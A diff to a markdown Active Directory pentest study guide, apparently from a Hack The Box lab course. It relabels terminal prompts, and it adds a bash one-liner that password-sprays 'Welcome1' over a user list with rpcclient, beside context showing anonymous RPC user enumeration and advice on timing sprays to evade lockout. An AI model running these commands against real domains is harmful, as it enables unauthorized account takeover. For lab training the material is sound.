@@ -3969,12 +3969,12 @@ Since we already possess valid credentials, we can query Active Directory direct
 
 <table width="100%">
 <tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
 </tr>
 <tr>
 <td width="20%">
 
-**`kali@kali:~$`**
+**`htb-student@ea-attack01:~$`**
 
 </td>
 <td>
@@ -4028,12 +4028,12 @@ Uses Kerberos Pre-Authentication to validate usernames without triggering standa
 
 <table width="100%">
 <tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
 </tr>
 <tr>
 <td width="20%">
 
-**`kali@kali:~$`**
+**`htb-student@ea-attack01:~$`**
 
 </td>
 <td>
@@ -4132,12 +4132,12 @@ Exploits anonymous SMB access to dump users via RPC.
 
 <table width="100%">
 <tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
 </tr>
 <tr>
 <td width="20%">
 
-**`kali@kali:~$`**
+**`htb-student@ea-attack01:~$`**
 
 </td>
 <td>
@@ -4185,12 +4185,12 @@ rpcclient -U "" -N 172.16.5.5 -c "enumdomusers"
 
 <table width="100%">
 <tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
 </tr>
 <tr>
 <td width="20%">
 
-**`kali@kali:~$`**
+**`htb-student@ea-attack01:~$`**
 
 </td>
 <td>
@@ -4236,12 +4236,12 @@ Queries the directory directly if anonymous binds are enabled.
 
 <table width="100%">
 <tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
 </tr>
 <tr>
 <td width="20%">
 
-**`kali@kali:~$`**
+**`htb-student@ea-attack01:~$`**
 
 </td>
 <td>
@@ -4314,9 +4314,41 @@ With our validated user list (`valid_users.txt`) and a solid understanding of th
 
 > **OPSEC Rule:** Spray **ONE** password across the user list, then wait 31 minutes before spraying a second password.
 
-### Tactic 1: Domain User Password Spraying
+<details>
+<summary><h3>Tactic 1: Using a Bash one-liner for the Attack</h3></summary>
 
-We are attempting to find users who have set weak passwords (e.g., `Welcome1`, `Password123`) or recycle known passwords we captured earlier.
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`htb-student@ea-attack01:~$`**
+
+</td>
+<td>
+
+```bash
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# OUTPUT
+```
+
+</td>
+</tr>
+</table>
+
+</details>
 
 </details>
 
